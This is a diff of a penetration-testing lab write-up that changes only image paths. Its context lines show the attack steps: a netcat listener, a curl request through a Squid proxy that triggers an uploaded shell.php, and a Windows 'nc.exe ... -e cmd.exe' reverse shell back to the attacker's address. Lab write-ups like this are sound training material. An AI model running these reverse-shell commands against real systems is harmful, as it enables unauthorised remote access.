@@ -77,7 +77,7 @@ Using proxy address http://192.168.75.189:3128/
 
 By adding the following configuration to Proxy Foxy, we can navigate to the 8080 port
 
-<figure><img src="../../../.gitbook/assets/image (4) (2) (1).png" alt=""><figcaption><p>Proxy Foxy Configuration</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption><p>Proxy Foxy Configuration</p></figcaption></figure>
 
 ### Port 8080 - HTTP Wampserver&#x20;
 
@@ -195,7 +195,7 @@ sudo rlwrap nc -lnvp 443
 curl --proxy http://192.168.75.189:3128 -s http://192.168.75.189:8080/shell.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Stable Shell
 
@@ -222,7 +222,7 @@ sudo rlwrap nc -lnvp 80
 nc.exe 192.168.49.75 80 -e cmd.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -294,4 +294,4 @@ Execute exploit with command:
 
 ## Proofs
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
